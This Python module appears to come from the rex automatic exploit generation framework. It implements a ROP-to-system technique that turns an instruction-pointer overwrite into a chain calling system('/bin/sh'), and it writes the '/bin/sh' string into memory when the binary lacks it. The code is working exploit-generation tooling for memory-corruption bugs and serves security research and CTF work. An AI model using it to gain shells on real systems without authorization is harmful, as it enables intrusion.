import logging

from angrop.errors import RopException

from ...vulnerability import Vulnerability
from .. import Exploit, CannotExploit
from ..technique import Technique

l = logging.getLogger("rex.exploit.techniques.rop_to_system")


class RopToSystem(Technique):

    name = "rop_to_system"
    applicable_to = ['unix']

    def check(self):
        if self.rop is None:
            self.check_fail_reason("No ROP available.")
            return False

            # can only exploit ip overwrites
        if not self.crash.one_of([Vulnerability.IP_OVERWRITE, Vulnerability.PARTIAL_IP_OVERWRITE]):
            self.check_fail_reason("Cannot control IP.")
            return False

        # find the address of system
        system_addr = self._find_func_address("system")
        if system_addr is None:
            self.check_fail_reason("The function system() could not be found in the binary.")
            return False

        return True

    def apply(self, **kwargs):

        # find the address of system
        system_addr = self._find_func_address("system")
        if system_addr is None:
            raise CannotExploit("[%s] the function system could not be found in the binary" % self.name)

        # look for "/bin/sh\x00", if it does not exist in the binary, write it to the memory
        cmd_addr = next(self.crash.project.loader.main_object.memory.find(b'/bin/sh\x00'), None)
        if not cmd_addr:
            # write out "/bin/sh\x00"
            target_str = b'/bin/sh\0'
            cmd_addr, cmd_constraint = self._write_global_data(target_str)
            if cmd_addr is None:
                try:
                    cmd_addr, cmd_constraint = self._read_in_global_data(target_str)
                except CannotExploit as e:
                    raise CannotExploit("[%s] cannot call read, %s" % (self.name, e))
                if cmd_addr is None:
                    raise CannotExploit("[%s] cannot write in /bin/sh" % self.name)

            # apply the constraint that /bin/sh must exist in the binary
            self.crash.state.add_constraints(cmd_constraint)

        # craft the caller chain
        try:
            chain = self.rop.func_call(system_addr, [cmd_addr])
        except RopException:
            raise CannotExploit("[%s] cannot craft caller chain" % self.name)

        # insert the chain into the binary
        try:
            chain, chain_addr = self._ip_overwrite_with_chain(chain, self.crash.state)
        except CannotExploit:
            raise CannotExploit("[%s] unable to insert chain" % self.name)

        # add the constraint to the state that the chain must exist at the address
        chain_mem = self.crash.state.memory.load(chain_addr, chain.payload_len)
        self.crash.state.add_constraints(chain_mem == self.crash.state.solver.BVV(chain.payload_str()))

        if not self.crash.state.satisfiable():
            raise CannotExploit("[%s] generated exploit is not satisfiable" % self.name)

        return Exploit(self.crash, bypasses_nx=True, bypasses_aslr=True)
